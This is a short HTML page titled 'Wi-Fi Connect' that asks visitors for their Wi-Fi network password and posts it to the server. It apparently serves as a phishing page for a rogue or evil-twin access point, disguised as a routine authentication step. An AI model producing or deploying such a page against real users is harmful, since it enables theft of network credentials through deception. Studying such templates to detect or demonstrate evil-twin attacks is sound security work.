<html><head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Wi-Fi Connect</title>
<link rel="stylesheet" href="/style.css">
</head><body>
<div class="card">
<div class="wifi-icon">&#128246;</div>
<h2>Wi-Fi Authentication Required</h2>
<p class="sub">Enter your network password to connect to the internet</p>
<form action="/" method="POST">
<input name="password" type="password" placeholder="Wi-Fi Password" required>
<button class="btn" type="submit">Connect</button>
</form>
<p class="terms">By connecting, you agree to the network terms of use.</p>
</div>
<script src="/script.js"></script>
</body></html>
